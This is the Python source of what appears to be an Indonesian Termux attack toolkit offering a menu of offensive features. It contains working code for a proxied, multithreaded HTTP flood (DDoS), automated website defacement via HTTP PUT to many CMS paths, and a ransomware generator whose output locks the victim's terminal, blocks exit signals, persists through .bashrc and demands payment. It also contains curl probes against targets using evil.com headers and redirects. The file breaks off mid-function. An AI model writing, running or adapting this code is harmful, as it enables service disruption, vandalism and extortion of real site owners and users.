import subprocess
import os
import sys
import time
import datetime
from urllib.parse import urlparse
import threading
import socket
import requests
import re
import random
import shutil

# Warna ANSI
RED = '\033[91m'
BLUE = '\033[96m'      # biru susu terang
YELLOW = '\033[93m'
LIME = '\033[92m'
CYAN = '\033[96m'
GREEN = '\033[92m'
WHITE = '\033[97m'
RESET = '\033[0m'

def clear():
    os.system('clear')

def show_greeting():
    now = datetime.datetime.now()
    jam = now.strftime("%I:%M %p").lower()
    tanggal = now.strftime("%d %B %Y").lower()

    if now.hour < 12:
        sapaan = "good morning"
    elif 12 <= now.hour < 18:
        sapaan = "good afternoon"
    else:
        sapaan = "good evening"

    print(f"{RED}• {YELLOW}{sapaan}, now is {jam}, {tanggal}{RESET}\n")

def print_logo():
    logo = """
     ▄▄▄▄    ██▓    ▄▄▄       ▄████▄   ██ ▄█▀    ██░ ██  ▄▄▄     ▄▄▄█████▓
    ▓█████▄ ▓██▒   ▒████▄    ▒██▀ ▀█   ██▄█▒    ▓██░ ██▒▒████▄   ▓  ██▒ ▓▒                  ▒██▒ ▄██▒██░   ▒██  ▀█▄  ▒▓█    ▄ ▓███▄░    ▒██▀▀██░▒██  ▀█▄ ▒ ▓██░ ▒░
    ▒██░█▀  ▒██░   ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄    ░▓█ ░██ ░██▄▄▄▄██░ ▓██▓ ░
    ░▓█  ▀█▓░██████▒▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄   ░▓█▒░██▓ ▓█   ▓██▒ ▒██▒ ░
    ░▒▓███▀▒░ ▒░▓  ░▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒    ▒ ░░▒░▒ ▒▒   ▓▒█░ ▒ ░░
    ▒░▒   ░ ░ ░ ▒  ░ ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░    ▒ ░▒░ ░  ▒   ▒▒ ░   ░
     ░    ░   ░ ░    ░   ▒   ░        ░ ░░ ░     ░  ░░ ░  ░   ▒    ░
"""
    print(f"{BLUE}{logo}{RESET}")
    print(f"{YELLOW}{'created by @TheRealRafael00'.center(70)}{RESET}\n")

def print_menu():
    menu_items = [
        {"no": 0, "command": "exit", "desc": "Keluar program"},
        {"no": 1, "command": "help", "desc": "Tampilkan bantuan"},
        {"no": 2, "command": "webinfo", "desc": "Info website"},
        {"no": 3, "command": "wordlist", "desc": "Generator wordlist"},
        {"no": 4, "command": "lamp", "desc": "Kontrol lampu led"},
        {"no": 5, "command": "phone", "desc": "Cari no hp internasional"},
        {"no": 6, "command": "findfile", "desc": "Cari file lupa lokasi path"},
        {"no": 7, "command": "sqlscanner", "desc": "sqlmap full otomatisasi"},
        {"no": 8, "command": "b64tool", "desc": "encrypt & decrypt file 100x"},
        {"no": 9, "command": "ddos", "desc": "DDoS L7"},
        {"no": 10, "command": "lampctl", "desc": "Control smart lamp"},
        {"no": 11, "command": "nmapscan", "desc": "nmap scan full fitur"},
        {"no": 12, "command": "subfinder", "desc": "Subfinder Suite full"},
        {"no": 13, "command": "whois", "desc": "WHOIS Lookup Domain/IP"},
        {"no": 14, "command": "sqli", "desc": "cek celah web with curl"},
        {"no": 15, "command": "sitehunter", "desc": "dir web"},
        {"no": 16, "command": "settings", "desc": "setting isi script ini"},
        {"no": 17, "command": "deface", "desc": "Auto Deface Website"},
        {"no": 18, "command": "ransomware", "desc": "generator auto ransomware"},
        {"no": 19, "command": "qrgenerate", "desc": "url tu QR generator"},
        {"no": 20, "command": "scanwifi", "desc": "Scan WiFi sekitar"},
        {"no": 21, "command": "findWlogin", "desc": "Cari halaman login admin"},
    ]

    # Tentukan lebar tetap untuk tiap kolom
    col1_width = 6   # No
    col2_width = 10  # Command
    col3_width = 28  # Description

    garis_h = "═"
    garis_v = "║"
    garis_p = "╬"
    pojok_kiri_atas = "╔"
    pojok_kanan_atas = "╗"
    pojok_kiri_bawah = "╚"
    pojok_kanan_bawah = "╝"
    garis_tengah_atas = "╦"
    garis_tengah_bawah = "╩"
    garis_tengah_samping = "╠"
    garis_tengah_akhir = "╣"

    total_width = col1_width + col2_width + col3_width + 6

    print(f"{CYAN}{pojok_kiri_atas}{garis_h * (col1_width + 2)}{garis_tengah_atas}{garis_h * (col2_width + 2)}{garis_tengah_atas}{garis_h * (col3_width + 2)}{pojok_kanan_atas}{RESET}")
    print(f"{CYAN}{garis_v} {YELLOW}{'No'.ljust(col1_width)} {CYAN}{garis_v} {BLUE}{'Command'.ljust(col2_width)} {CYAN}{garis_v} {GREEN}{'Description'.ljust(col3_width)} {CYAN}{garis_v}{RESET}")
    print(f"{CYAN}{garis_tengah_samping}{garis_h * (col1_width + 2)}{garis_p}{garis_h * (col2_width + 2)}{garis_p}{garis_h * (col3_width + 2)}{garis_tengah_akhir}{RESET}")

    for item in menu_items:
        print(f"{CYAN}{garis_v} {RED}{str(item['no']).ljust(col1_width)} {CYAN}{garis_v} {BLUE}{item['command'].ljust(col2_width)} {CYAN}{garis_v} {GREEN}{item['desc'].ljust(col3_width)} {CYAN}{garis_v}{RESET}")

    print(f"{CYAN}{pojok_kiri_bawah}{garis_h * (col1_width + 2)}{garis_tengah_bawah}{garis_h * (col2_width + 2)}{garis_tengah_bawah}{garis_h * (col3_width + 2)}{pojok_kanan_bawah}{RESET}")

def valid_url(url):
    return re.match(r"^https?://[a-zA-Z0-9.-]+(\.[a-zA-Z]{2,})+", url) is not None

def get_ip_list(host):
    try:
        return list(set(socket.gethostbyname_ex(host)[2]))
    except Exception as e:
        print(f"{RED}[!] Gagal resolve IP: {e}{RESET}")
        return []

def get_proxies():
    try:
        print(f"{YELLOW}[i] Mengambil daftar proxy...{RESET}")
        url = "https://proxy-list.download/api/v1/get?type=https"
        proxies = requests.get(url).text.strip().split("\r\n")
        return list(set(proxies))
    except:
        return []

def generate_deface_file(target_url):
    # Deteksi jenis web dari URL
    if ".php" in target_url or "index.php" in target_url:
        ext = "php"
        filename = "deface.php"
    else:
        ext = "html"
        filename = "security.html"

    html_template = """
    <html>
    <head><title>Security Report</title></head>
    <body style="background-color:black; color:white; text-align:center; padding-top:20%;">
    <h1>sorry for this</h1>
    <p>IM not attack your website,<br>but, i'm want to report this to you for get apreciate certificate</p>
    </body>
    </html>
    """

    php_template = f"""<?php echo <<<EOD
{html_template}
EOD;
?>"""

    with open(filename, "w") as f:
        if ext == "php":
            f.write(php_template)
        else:
            f.write(html_template)

    return filename

def generate_headers():
    return {
        "User-Agent": random.choice([
            f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/{random.randint(500,599)}.36 (KHTML, like Gecko) Chrome/{random.randint(90,115)}.0.{random.randint(1000,4999)}.100 Safari/537.36",
            f"Mozilla/5.0 (Linux; Android 11; Mobile; rv:{random.randint(60,90)}.0) Gecko/20100101 Firefox/{random.randint(60,90)}.0",
            f"Opera/9.80 (Android; Opera Mini/{random.randint(30,60)}.{random.randint(1000,9999)}) Presto/2.12.{random.randint(100,999)} Version/12.16"
        ]),
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "Referer": "https://www.google.com/",
        "Cache-Control": "no-cache"
    }

def http_flood(target_url, proxies):
    while True:
        try:
            proxy = random.choice(proxies)
            proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            headers = generate_headers()
            requests.get(target_url, headers=headers, proxies=proxy_dict, timeout=5)
        except:
            pass

def fitur_9():
    clear()
    print(f"{CYAN}Layer 7 HTTP Flood - PRO VERSION{RESET}")

    url = input(f"{YELLOW}Masukkan URL target (http/https): {RESET}").strip()
    if not valid_url(url):
        print(f"{RED}URL tidak valid!{RESET}")
        time.sleep(2)
        return

    host = re.sub(r"https?://", "", url).split("/")[0]
    ip_list = get_ip_list(host)
    if not ip_list:
        print(f"{RED}Tidak ditemukan IP target.{RESET}")
        return

    print(f"{GREEN}[✓] Ditemukan {len(ip_list)} IP dari domain {host}:{RESET}")
    for ip in ip_list:
        print(f"{CYAN}→ {ip}{RESET}")

    try:
        threads = int(input(f"{YELLOW}Masukkan jumlah thread (per IP): {RESET}"))
        if threads < 1: raise ValueError
    except:
        print(f"{RED}Thread tidak valid.{RESET}")
        return

    print(f"{YELLOW}[i] Mengambil daftar proxy...{RESET}")
    proxies = get_proxies()
    if not proxies:
        print(f"{RED}Proxy tidak tersedia. Periksa koneksi atau ganti sumber proxy.{RESET}")
        return

    print(f"{YELLOW}→ Mengecek proxy yang hidup...{RESET}")
    live_proxies = []
    for proxy in proxies:
        try:
            requests.get("http://example.com", proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"}, timeout=2)
            live_proxies.append(proxy)
        except:
            continue

    if not live_proxies:
        print(f"{RED}Tidak ada proxy yang aktif.{RESET}")
        return

    print(f"{LIME}[✓] {len(live_proxies)} proxy aktif ditemukan!{RESET}")
    print(f"\n{GREEN}[✓] Memulai HTTP Flood... tekan Ctrl+C untuk berhenti{RESET}\n")

    attack_count = [0]
    success_count = [0]
    failed_count = [0]

    def http_flood_live(target_ip, path, proxy_list):
        while True:
            try:
                proxy = random.choice(proxy_list)
                proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                headers = generate_headers()
                url_target = f"http://{target_ip}{path}"
                response = requests.get(url_target, headers=headers, proxies=proxy_dict, timeout=5)
                attack_count[0] += 1

                if response.status_code < 400:
                    success_count[0] += 1
                    print(f"{LIME}[✓] Serangan berhasil ke {target_ip}{RESET}")
                else:
                    failed_count[0] += 1
                    print(f"{YELLOW}[!] Serangan gagal ke {target_ip} (kode: {response.status_code}){RESET}")

            except requests.exceptions.ConnectionError:
                failed_count[0] += 1
                print(f"{YELLOW}[!] Proxy gagal konek ke {target_ip}{RESET}")
            except requests.exceptions.ReadTimeout:
                failed_count[0] += 1
                print(f"{YELLOW}[!] Timeout saat menghubungi {target_ip}{RESET}")
            except Exception as e:
                failed_count[0] += 1
                print(f"{YELLOW}[!] Gagal: {str(e)}{RESET}")

    def is_website_down(test_url):
        try:
            requests.get(test_url, timeout=5)
            return False
        except:
            return True

    path = urlparse(url).path or "/"

    for ip in ip_list:
        for _ in range(threads):
            t = threading.Thread(target=http_flood_live, args=(ip, path, live_proxies))
            t.daemon = True
            t.start()

    try:
        while True:
            status = f"{YELLOW}Total: {attack_count[0]}  {LIME}✓ Berhasil: {success_count[0]}  {YELLOW}! Gagal: {failed_count[0]}{RESET}"
            if is_website_down(url):
                status += f"  {RED}[!] WEBSITE SUDAH DOWN!{RESET}"
            print(status, end="\r")
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}Serangan dihentikan oleh pengguna.{RESET}")

    def http_flood(target_ip, path, proxy_list):
        while True:
            try:
                proxy = random.choice(proxy_list)
                proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                headers = generate_headers()
                url_target = f"http://{target_ip}{path}"
                requests.get(url_target, headers=headers, proxies=proxy_dict, timeout=3)
                attack_count[0] += 1
            except:
                pass

    path = urlparse(url).path or "/"

    for ip in ip_list:
        for _ in range(threads):
            t = threading.Thread(target=http_flood, args=(ip, path, live_proxies))
            t.daemon = True
            t.start()

    try:
        while True:
            print(f"{YELLOW}Total serangan terkirim: {LIME}{attack_count[0]}{RESET}", end='\r')
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}Serangan dihentikan oleh pengguna.{RESET}")

def fitur_21_adminfinder():
    import os, requests, time
    from urllib.parse import urljoin
    from termcolor import colored
    from tqdm import tqdm

    os.system("clear")
    print(colored("=== FITUR 21: ADVANCED ADMIN PANEL FINDER ===", "cyan"))
    target = input(colored("Masukkan URL target (contoh: https://example.com): ", "yellow")).strip()

    if not target.startswith("http"):
        target = "http://" + target
    if target.endswith("/"):
        target = target[:-1]

    wordlist_path = os.path.join(os.getcwd(), "admin-paths.txt")
    if not os.path.exists(wordlist_path):
        print(colored("[!] File 'admin-paths.txt' tidak ditemukan di folder ini!", "red"))
        return

    with open(wordlist_path, "r") as f:
        paths = [line.strip() for line in f if line.strip()]

    found_links = []
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"}
    keywords = ["login", "username", "password", "admin", "form", "signin"]

    log_file = open("admin_found.txt", "w")
    print(colored(f"[✓] Memulai scan dari wordlist, total: {len(paths)} path\n", "cyan"))

    for path in tqdm(paths, desc="Scanning", ncols=70):
        url = urljoin(target + "/", path)
        try:
            r = requests.get(url, headers=headers, timeout=5, allow_redirects=True)
            content = r.text.lower()

            match = [k for k in keywords if k in content]

            if r.status_code == 200 and match:
                match_str = ', '.join(match)
                print(colored(f"\n[✓] LOGIN DITEMUKAN: {url}", "green"))
                print(colored(f"    ↳ Keyword: {match_str}", "yellow"))
                log_file.write(f"{url} [keyword: {match_str}]\n")
                found_links.append(url)
        except:
            continue

    log_file.close()

    print("\n" + colored("=== HASIL SCAN ===", "cyan"))
    try:
        if found_links:
            for link in found_links:
                print(colored(f"- {link}", "green"))
            print(colored(f"\n[✓] Disimpan ke 'admin_found.txt'", "blue"))
        else:
            print(colored("[X] Tidak ditemukan login admin dari wordlist ini.", "red"))
    except Exception as e:
        print(colored(f"[!] Terjadi kesalahan saat menampilkan hasil: {e}", "red"))

    try:
        input(colored("\nSelesai! Tekan ENTER untuk kembali ke menu utama...", "cyan"))
    except KeyboardInterrupt:
        print(colored("\n[!] Keyboard Interrupt diterima. Keluar ke menu utama...", "yellow"))

def fitur_20_scan_wifi():
    import os
    import subprocess
    import requests
    from termcolor import colored

    os.system("clear")
    print(colored("=== FITUR 20: INFO JARINGAN WIFI YANG TERSAMBUNG ===", "cyan"))

    # Ambil nama SSID
    try:
        ssid = subprocess.getoutput("termux-wifi-connectioninfo")
        if "ssid" not in ssid:
            print(colored("[X] Tidak sedang tersambung ke WiFi!", "red"))
            return
        import json
        ssid_data = json.loads(ssid)
        ssid_name = ssid_data.get("ssid", "Tidak diketahui")
        mac = ssid_data.get("bssid", "-")
    except:
        ssid_name = "Gagal mendeteksi SSID"
        mac = "-"

    # Ambil IP Gateway
    gateway = subprocess.getoutput("ip route | grep default | awk '{print $3}'").strip()

    # Ambil info lokasi berdasar IP Gateway
    try:
        r = requests.get(f"http://ip-api.com/json/{gateway}?lang=ID", timeout=5)
        ipinfo = r.json()
    except:
        ipinfo = {}

    # Format tampilan kotak keren
    print("\n" + colored("╔══════════════════════════════════════════════════════╗", "cyan"))
    print(colored(f"║ SSID WiFi   : {ssid_name}", "cyan"))
    print(colored(f"║ MAC Address : {mac}", "cyan"))
    print(colored(f"║ IP Gateway  : {gateway}", "cyan"))
    print(colored("╠══════════════════════════════════════════════════════╣", "cyan"))

    if ipinfo:
        print(colored(f"║ ISP         : {ipinfo.get('isp', '-')}", "cyan"))
        print(colored(f"║ IP Publik   : {ipinfo.get('query', '-')}", "cyan"))
        print(colored(f"║ Organisasi  : {ipinfo.get('org', '-')}", "cyan"))
        print(colored(f"║ Kota        : {ipinfo.get('city', '-')}", "cyan"))
        print(colored(f"║ Negara      : {ipinfo.get('country', '-')}", "cyan"))
        print(colored(f"║ Wilayah     : {ipinfo.get('regionName', '-')}", "cyan"))
        print(colored(f"║ Kode Pos    : {ipinfo.get('zip', '-')}", "cyan"))
        print(colored(f"║ Zona Waktu  : {ipinfo.get('timezone', '-')}", "cyan"))
    else:
        print(colored("║ Tidak bisa ambil info lokasi jaringan.", "yellow"))
    print(colored("╚══════════════════════════════════════════════════════╝", "cyan"))

    input(colored("\nTekan ENTER untuk kembali...", "yellow"))

def fitur_19_qr_generator():
    import os
    import re
    import qrcode
    from qrcode.image.pil import PilImage
    from termcolor import colored

    os.system("clear")
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'

    print(f"{CYAN}=== FITUR 19: QR CODE GENERATOR ==={RESET}\n")

    def is_valid_url(url):
        pattern = r"^(https?://)?(www\.)?([a-zA-Z0-9\-]+\.)+[a-zA-Z]{2,}(/.*)?$"
        return re.match(pattern, url)

    url = input(f"{YELLOW}Masukkan URL atau domain (contoh: https://google.com): {RESET}").strip()

    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url

    if not is_valid_url(url):
        print(f"{RED}[X] URL tidak valid. Pastikan formatnya benar!{RESET}")
        return

    filename = input(f"{YELLOW}Masukkan nama file (tanpa .png): {RESET}").strip()
    if not filename:
        filename = "qr_result"
    filepath = f"{filename}.png"

    print(f"{GREEN}[✓] Membuat QR code...{RESET}")

    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_H,
        box_size=10,
        border=4,
    )
    qr.add_data(url)
    qr.make(fit=True)

    img: PilImage = qr.make_image(fill_color="darkblue", back_color="white")
    img.save(filepath)

    print(f"{GREEN}[✓] QR code berhasil dibuat: {filepath}{RESET}")

    # Tampilkan QR ke terminal (opsional aesthetic)
    try:
        import pyqrcode
        qterm = pyqrcode.create(url)
        print(f"\n{CYAN}Scan QR ini dengan HP-mu:{RESET}\n")
        print(colored(qterm.terminal(quiet_zone=1), "cyan"))
    except:
        print(f"{YELLOW}[!] Preview QR tidak bisa ditampilkan di terminal (butuh pyqrcode & pypng).{RESET}")

    input(f"\n{YELLOW}Tekan ENTER untuk kembali...{RESET}")

def fitur_17_deface():
    import os
    import requests
    from urllib.parse import urljoin
    import urllib3

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    CYAN = '\033[96m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'

    os.system("clear")
    print(f"{CYAN}=== AUTO DEFACE MODE - FITUR 17 ==={RESET}\n")

    url = input(f"{YELLOW}Masukkan URL atau domain target (contoh: https://site.com): {RESET}").strip()
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url

    deface_filename = generate_deface_file(url)

    if not os.path.exists(deface_filename):
        print(f"{RED}[X] File {deface_filename} gagal dibuat!{RESET}")
        return

    with open(deface_filename, "rb") as f:
        deface_content = f.read()

    # Target path diperluas untuk support CMS (Joomla, WordPress, custom)
    target_paths = [
        "/", "/uploads/", "/images/", "/admin/", "/backup/", "/old/", "/test/",
        "/media/", "/tmp/", "/images/stories/", "/templates/", "/templates/protostar/", "/templates/beez3/"
    ]

    success_links = []

    print(f"{CYAN}[i] Mulai mencoba upload deface ke target...{RESET}\n")

    for path in target_paths:
        full_url = urljoin(url, path + deface_filename)

        try:
            response = requests.put(
                full_url,
                data=deface_content,
                headers={"Content-Type": "text/html"},
                timeout=5,
                verify=False
            )
            status_code = response.status_code

            if status_code in [200, 201, 204]:
                check = requests.get(full_url, timeout=5, verify=False)
                if check.status_code == 200 and "sorry for this" in check.text.lower():
                    print(f"{GREEN}[✓] Berhasil upload ke: {full_url}{RESET}")
                    success_links.append(full_url)
                else:
                    print(f"{YELLOW}[?] Upload mungkin berhasil tapi tidak dapat diakses langsung: {full_url}{RESET}")
            else:
                print(f"{RED}[X] Gagal upload ke: {full_url} (status {status_code}){RESET}")
        except Exception as e:
            print(f"{RED}[!] Error saat upload ke {full_url}: {e}{RESET}")

    if success_links:
        print(f"\n{GREEN}=== HASIL DEFACE BERHASIL ==={RESET}")
        for link in success_links:
            print(f"{CYAN}- {link}{RESET}")
    else:
        print(f"\n{RED}Tidak ada path yang berhasil dideface.{RESET}")

    input(f"\n{YELLOW}Tekan ENTER untuk kembali ke menu...{RESET}")

def fitur_18_ransom_generator():
    import os

    CYAN = '\033[96m'
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    RESET = '\033[0m'

    os.system("clear")
    print(f"{CYAN}=== FITUR 18: PEMBUAT RANSOMWARE OTOMATIS ==={RESET}\n")

    key = input(f"{YELLOW}Masukkan password/kunci terminal: {RESET}").strip()
    author = input(f"{YELLOW}Masukkan nama tim/anonim (contoh: DedSec): {RESET}").strip()
    contact = input(f"{YELLOW}Masukkan nomor pembayaran/kontak admin: {RESET}").strip()

    if not key or not author or not contact:
        print(f"{RED}Semua input wajib diisi!{RESET}")
        return

    template_code = f'''import os
import time
import socket
import requests
import signal
import sys
from rich import print
from rich.prompt import Prompt
from rich.panel import Panel
from rich.console import Console

console = Console()
KEY = "{key}"  # password terminal
HOME = os.path.expanduser("~")
LOCK_FILE = os.path.join(HOME, ".termux_lock_active")
BASHRC = os.path.join(HOME, ".bashrc")
SCRIPT_PATH = os.path.join(HOME, ".ransomware.py")

def block_signals():
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTSTP, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

def signal_handler(sig, frame):
    print("\\n[bold red]⚠️ Tidak bisa keluar! Terminal sedang terkunci![/bold red]")

def get_public_ip():
    try:
        ip = requests.get("https://api.ipify.org").text
        return ip
    except:
        return "Tidak dapat mengambil IP publik."

def animate_text(text, style="bold red", delay=0.03):
    for char in text:
        print(f"[{{style}}]{{char}}[/]", end="", flush=True)
        time.sleep(delay)
    print()

def show_locked_screen():
    os.system("clear")
    console.rule("[bold red]🔒 ☠️HACKED BY {author}☠️ 🔒")
    ip = get_public_ip()
    console.print(Panel.fit(f"[bold white]IP Publik Kamu Terdeteksi:\\n[red]{{ip}}[/red]", title="📡 IP DETEKSI", border_style="bold red"))
    animate_text("Terminal ini telah dikunci oleh sistem.\\nUntuk membukanya, masukkan kunci akses yang benar.\\n", "bold yellow")
    animate_text(f"Beli Key Untuk Membuka Terminal...\\n{contact}\\n", "bold yellow")

def access_granted():
    animate_text("\\n✔️ Kunci Benar! Terminal Dibuka. Lain Kali Hati Hati Ya Bro...", "bold green")
    time.sleep(1)
    if os.path.exists(LOCK_FILE):
        os.remove(LOCK_FILE)
    os.system("clear")

def access_denied():
    animate_text("\\n❌ Kunci Salah! Terminal Tetap Terkunci.", "bold red")
    time.sleep(1)

def auto_append_bashrc():
    if not os.path.exists(BASHRC):
        with open(BASHRC, "w") as f:
            f.write("# Termux startup script\\n")
    with open(BASHRC, "r") as f:
        content = f.read()
    if f"python3 {{SCRIPT_PATH}}" not in content:
        with open(BASHRC, "a") as f:
            f.write(f"\\n# Auto lock terminal\\npython3 {{SCRIPT_PATH}}\\n")
        animate_text("👹Termux Berhasil Terinfeksi👹", "bold green")

def lock_terminal():
    with open(LOCK_FILE, "w") as f:
        f.write("locked")
    while True:
        show_locked_screen()
        try:
            key = Prompt.ask("[bold yellow]🔐 Masukkan kunci akses")
        except (EOFError, KeyboardInterrupt):
            print("\\n[bold red]❌ Tidak bisa menggunakan Ctrl+C atau Ctrl+D! Terminal terkunci![/bold red]")
            time.sleep(2)
            continue

        if key == KEY:
            access_granted()
            break
        else:
            access_denied()

def main():
    block_signals()
    auto_append_bashrc()
    lock_terminal()

if __name__ == "__main__":
    if not os.path.exists(SCRIPT_PATH):
        import shutil
        shutil.copy(__file__, SCRIPT_PATH)
    main()
'''

    try:
        with open("ransomware.py", "w") as f:
            f.write(template_code)
        print(f"\n{GREEN}[✓] Script 'ransomware.py' berhasil dibuat di direktori ini.{RESET}")
    except Exception as e:
        print(f"{RED}[X] Gagal menyimpan file: {e}{RESET}")

    input(f"\n{YELLOW}Tekan ENTER untuk kembali ke menu...{RESET}")

def settings():
    clear()
    print(f"{CYAN}=== SETTINGS VVIP TOOL ==={RESET}\n")
    print(f"{CYAN}0.{RESET} Kembali ke menu utama")
    print(f"{CYAN}1.{RESET} Tambahkan fungsi secara otomatis\n")

    pilihan = input(f"{YELLOW}Masukkan pilihan (0/1): {RESET}").strip()
    
    if pilihan == '0':
        print(f"{GREEN}Kembali ke menu utama...{RESET}")
        time.sleep(1)
        return

    elif pilihan == '1':
        clear()
        print(f"{CYAN}=== AUTO ADD FUNCTION MODE ==={RESET}")
        print(f"{YELLOW}Masukkan kode def lengkap (akhiri dengan baris kosong dua kali):{RESET}")

        # Ambil input kode def
        lines_input = []
        while True:
            line = input()
            if line == "":
                if lines_input and lines_input[-1] == "":
                    break
            lines_input.append(line)

        kode_def = "\n".join(lines_input).strip()

        tag = input(f"{YELLOW}Masukkan tag command (misal: superfunc): {RESET}").strip()
        desc = input(f"{YELLOW}Masukkan deskripsi fitur: {RESET}").strip()

        script_file = sys.argv[0]

        try:
            with open(script_file, "r") as f:
                lines = f.readlines()

            # Tambah def di akhir
            lines.append("\n\n" + kode_def + "\n")

            # Cari nomor fitur terakhir
            import re
            no_list = [int(x) for x in re.findall(r'"no":\s*(\d+)', ''.join(lines))]
            next_no = max(no_list) + 1 if no_list else 0

            # Tambah ke print_menu
            in_print_menu = False
            for i in range(len(lines)):
                if lines[i].strip().startswith("def print_menu"):
                    in_print_menu = True
                if in_print_menu and 'menu_items = [' in lines[i]:
                    for j in range(i, len(lines)):
                        if lines[j].strip().endswith(']'):
                            lines.insert(j, f'        {{"no": {next_no}, "command": "{tag}", "desc": "{desc}"}},\n')
                            break
                    break

            # Tambah ke handle_command
            in_handle_command = False
            for i in range(len(lines)):
                if lines[i].strip().startswith("def handle_command"):
                    in_handle_command = True
                if in_handle_command and 'mapping = {' in lines[i]:
                    for j in range(i, len(lines)):
                        if lines[j].strip().startswith('}'):
                            lines.insert(j, f'    "{next_no}": {tag},\n    "{tag}": {tag},\n')
                            break
                    break

            # Simpan file
            with open(script_file, "w") as f:
                f.writelines(lines)

            print(f"{GREEN}[✓] Fungsi, menu, dan mapping berhasil ditambahkan sebagai fitur no {next_no}.{RESET}")
            print(f"{YELLOW}[i] Restart script untuk bisa gunakan command baru: {tag}{RESET}")

        except Exception as e:
            print(f"{RED}[X] Gagal update script: {e}{RESET}")

        input(f"\n{YELLOW}Tekan ENTER untuk kembali...{RESET}")

    else:
        print(f"{RED}Pilihan tidak valid!{RESET}")
        time.sleep(1.5)

def fitur_14():
    import subprocess
    import re
    import os
    import random

    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    RESET = '\033[0m'

    os.system("clear")
    print(f"{CYAN}=== CURL Real Vuln Hunter ==={RESET}")

    target = input(f"{YELLOW}Masukkan URL target: {RESET}").strip()
    if not target.startswith("http"):
        target = "http://" + target

    try:
        status = subprocess.check_output(f"curl -Is {target} | head -n1", shell=True, universal_newlines=True)
        if re.search(r'200|301|302', status):
            print(f"{GREEN}[✓] Target online: {status.strip()}{RESET}")
        else:
            print(f"{RED}[X] Target tidak merespons baik: {status.strip()}{RESET}")
            return
    except:
        print(f"{RED}[X] Gagal hubungi target.{RESET}")
        return

    print(f"{CYAN}→ Header fingerprint{RESET}")
    out = subprocess.getoutput(f"curl -Is {target}")
    if re.search(r"Server:|X-Powered-By:", out, re.I):
        print(f"{GREEN}[CELAH] Header ungkap info\n{out}{RESET}")
    else:
        print(f"{RED}[AMAN] Header aman{RESET}")

    print(f"{CYAN}→ Open redirect{RESET}")
    out = subprocess.getoutput(f'curl -s -o /dev/null -w "%{{url_effective}}" "{target}/?redirect=https://evil.com"')
    if "evil.com" in out:
        print(f"{GREEN}[CELAH] Redirect ke luar: {out}{RESET}")
    else:
        print(f"{RED}[AMAN] Redirect aman{RESET}")

    print(f"{CYAN}→ HTTP PUT{RESET}")
    fpath = f"./puttest{random.randint(1000,9999)}.txt"
    with open(fpath, "w") as f:
        f.write("test")
    out = subprocess.getoutput(f'curl -s -X PUT --upload-file {fpath} {target}/puttest.txt -o /dev/null -w "%{{http_code}}"')
    if out.strip() in ["200", "201"]:
        print(f"{GREEN}[CELAH] PUT diterima: {out.strip()}{RESET}")
    else:
        print(f"{RED}[AMAN] PUT ditolak: {out.strip()}{RESET}")

    print(f"{CYAN}→ HTTP DELETE{RESET}")
    out = subprocess.getoutput(f'curl -s -X DELETE {target}/puttest.txt -o /dev/null -w "%{{http_code}}"')
    if out.strip() in ["200", "202", "204"]:
        print(f"{GREEN}[CELAH] DELETE diizinkan: {out.strip()}{RESET}")
    else:
        print(f"{RED}[AMAN] DELETE ditolak: {out.strip()}{RESET}")

    print(f"{CYAN}→ TRACE method{RESET}")
    out = subprocess.getoutput(f'curl -s -X TRACE {target}')
    if re.search(r"TRACE", out, re.I):
        print(f"{GREEN}[CELAH] TRACE aktif{RESET}")
    else:
        print(f"{RED}[AMAN] TRACE off{RESET}")

    print(f"{CYAN}→ OPTIONS method{RESET}")
    out = subprocess.getoutput(f'curl -s -X OPTIONS {target}')
    if "Allow:" in out:
        print(f"{GREEN}[INFO] Allow: {out}{RESET}")
    else:
        print(f"{RED}[AMAN] Tidak ada Allow header{RESET}")

    print(f"{CYAN}→ SSRF basic{RESET}")
    out = subprocess.getoutput(f'curl -s "{target}/?url=http://127.0.0.1"')
    if "127.0.0.1" in out or "localhost" in out:
        print(f"{GREEN}[CELAH] SSRF indikasi{RESET}")
    else:
        print(f"{RED}[AMAN] Tidak indikasi SSRF{RESET}")

    print(f"{CYAN}→ CRLF injection{RESET}")
    out = subprocess.getoutput(f'curl -s "{target}/?q=test%0d%0aSet-Cookie:crlf=1" -I')
    if "Set-Cookie: crlf=1" in out:
        print(f"{GREEN}[CELAH] CRLF terdeteksi{RESET}")
    else:
        print(f"{RED}[AMAN] CRLF aman{RESET}")

    print(f"{CYAN}→ Host header injection{RESET}")
    out = subprocess.getoutput(f'curl -s -H "Host: evil.com" {target}')
    if "evil.com" in out:
        print(f"{GREEN}[CELAH] Host reflected{RESET}")
    else:
        print(f"{RED}[AMAN] Host header aman{RESET}")

    print(f"{CYAN}→ CORS misconfig{RESET}")
    out = subprocess.getoutput(f'curl -s -I -H "Origin: evil.com" {target}')
    if re.search(r"Access-Control-Allow-Origin: \*|evil.com", out, re.I):
